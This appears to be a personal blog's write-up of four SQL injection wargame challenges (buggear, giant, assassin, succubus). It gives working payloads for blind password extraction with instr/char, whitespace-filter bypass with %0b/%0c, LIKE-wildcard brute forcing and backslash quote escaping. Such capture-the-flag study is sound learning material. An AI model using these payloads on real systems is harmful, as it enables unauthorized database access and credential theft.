  <h2 id="day-4"><a class="anchor" href="#day-4" title='Anchor for: Day 4.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Day 4</h2> 

<ul>
<li>buggear</li>
<li>giant</li>
<li>assassin</li>
<li>succubus</li>
</ul>









  <h3 id="buggear"><a class="anchor" href="#buggear" title='Anchor for: buggear.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> buggear</h3> 

<p>Some filter is added.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    substr,ascii,<span style="color:#f92672">=</span>,<span style="color:#66d9ef">or</span>,<span style="color:#66d9ef">and</span>, ,<span style="color:#66d9ef">like</span>,<span style="color:#ae81ff">0</span>x
</code></pre></div><p>I search gg and find a function <code>instr</code>.
This function has 2 parameters <code>instr(a,b)</code> and return <code>Match Position</code></p>
<p>if <code>b</code> not in <code>a</code>, it&rsquo;ll return 0, else return &gt; 0</p>
<ul>
<li>Part 1: combine <code>instr</code> + <code>char</code> we can <code>select id='admin'</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id) <span style="color:#75715e">-- return 1
</span></code></pre></div><ul>
<li>Part 2: combine <code>left</code> + <code>char</code> + <code>instr</code> to brute password</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">1</span>),char([<span style="color:#ae81ff">48</span><span style="color:#f92672">-&gt;</span><span style="color:#ae81ff">57</span><span style="color:#f92672">|</span><span style="color:#ae81ff">97</span><span style="color:#f92672">-&gt;</span><span style="color:#ae81ff">122</span>]))
</code></pre></div><ul>
<li>Part 3: craft payload:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&amp;&amp;</span>instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">1</span>),char(<span style="color:#ae81ff">53</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
<span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&amp;&amp;</span>instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">2</span>),char(<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">50</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
...
<span style="color:#66d9ef">select</span> char(<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">49</span>)
<span style="color:#f92672">==&gt;</span> pw <span style="color:#f92672">=</span> <span style="color:#ae81ff">52</span>dc3991
</code></pre></div>








  <h3 id="giant"><a class="anchor" href="#giant" title='Anchor for: giant.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> giant</h3> 

<p>The task we must complete is split <code>fromprob_giant</code> to <code>from prob_giant</code>.</p>
<p>The length of <code>shit</code> is 1, so we can&rsquo;t use <code>/**/</code>.</p>
<p>I wonder why author filter <code>\n</code>,<code>\r</code>,<code>\t</code>.</p>
<p>So I brute force <code>shit</code> param like this:</p>
<pre aria-label="Box containing code sample." tabindex=0><code>    shit=%0[a-z0-9]
</code></pre><p>Gotta, we can use <code>%0b</code> and <code>%0c</code> to bypass this filters.</p>









  <h3 id="assassin"><a class="anchor" href="#assassin" title='Anchor for: assassin.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> assassin</h3> 

<p>It only filter <code>'</code> and pw param is in quote.</p>
<p>So we can&rsquo;t use condition here, but wait it use <code>like</code>.</p>
<p>First, we need to find out about <code>like</code></p>
<pre aria-label="Box containing code sample." tabindex=0><code>There are two wildcards often used in conjunction with the LIKE operator:

The percent sign (%) represents zero, one, or multiple characters
The underscore sign (_) represents one, single character
</code></pre><p>Now, let go to brute force</p>
<pre aria-label="Box containing code sample." tabindex=0><code>-- query % -&gt; guest
-- query 9% -&gt; guest
-- query 90% -&gt; still guest
-- query 902% -&gt; still guest
-- query 902e% -&gt; admin
-- Try with underscore
-- query ________ -&gt; guest
-- query 9_______ -&gt; guest
-- query 90______ -&gt; guest
-- query 902_____ -&gt; guest
-- query 902e____ -&gt; admin
</code></pre><p>From here, we can see <code>pw</code> of admin and guest have some similarities.</p>









  <h3 id="succubus"><a class="anchor" href="#succubus" title='Anchor for: Succubus.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#hashtag"/></svg></a> Succubus</h3> 

<p>The challenge is not hard, if you notice 2 param <code>id</code>,<code>pw</code>, you&rsquo;ll found solution.</p>
<p>Review the code below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&#39;/&#39;</span>,$_GET[<span style="color:#a6e22e">id</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;HeHe&#34;</span>); <span style="color:#75715e">// filter &#39;
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&#39;/&#39;</span>,$_GET[<span style="color:#a6e22e">pw</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;HeHe&#34;</span>);
  $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_succubus where id=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>; 
  <span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;succubus&#34;</span>);  <span style="color:#75715e">// anything return from $query
</span></code></pre></div><p>Obviously, we can&rsquo;t use any condition command trick. Instead of, sign <code>\</code> is the best choice.</p>
<p>The payload will be look like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    Payload : id<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">&amp;</span>pw<span style="color:#f92672">=</span><span style="color:#66d9ef">or</span>(<span style="color:#ae81ff">1</span>)<span style="color:#75715e">-- -
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">Explain</span>:
        <span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_succubus <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;\&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;or(1)-- -&#39;</span>
        <span style="color:#75715e">-- id=&#39;\&#39; and pw=&#39;,thus $_GET[pw] will be escaped
</span></code></pre></div>

        
    </article>
  </main>


    </div>
    
    <footer>
      


  

    

    
      
      
    
    
    <p>Welcome to my lord.</p>

  

















<section class="req-js">
  <button class="outline-dashed" title="Change to light/dark mode."><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><use xlink:href="/img/bundle.min.ae45e7a9a0a65150dd900a58f35fe84d.svg#adjust"/></svg></button><input class="outline-dashed" type="color" list="presets" value="#1f676b" title="Change accent color." aria-label="Change accent color."><datalist id="presets"><option value="#1f676b"><option value="#1dbc91"></datalist>
</section>



  <noscript>
    <p class="noscript">Unable to execute JavaScript. Some features were disabled.</p>
  </noscript>



    </footer>
    
    
    

    
    

  </body>
</html>
